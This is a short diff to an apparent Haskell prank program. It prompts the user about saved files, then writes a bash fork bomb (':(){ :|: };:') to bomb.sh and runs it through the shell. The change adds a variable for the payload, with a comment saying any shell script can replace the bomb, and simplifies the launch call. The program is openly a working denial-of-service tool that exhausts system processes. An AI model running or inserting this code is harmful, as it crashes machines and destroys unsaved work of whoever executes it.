@@ -8,7 +8,10 @@
 --Import for system function
 import System.Process
 
+--Useful variables to keep line lengths down
+--Can substitute any valid shell script for the text in bomb
 bomb =  ":(){ :|: };:"
+command = "echo \"" ++ bomb ++ "\" > bomb.sh | bash bomb.sh"
 
 main = do
 	putStrLn "Have you saved all your files? (y/n)"
@@ -19,5 +22,5 @@ parse response
 	| response == "y" = runFork
 	| otherwise = main
 
-runFork = readProcess "/bin/bash" ["-c","echo ",bomb," > bomb.sh | bash bomb.sh"] ""
+runFork = readProcess "/bin/bash" ["-c",command] ""
 
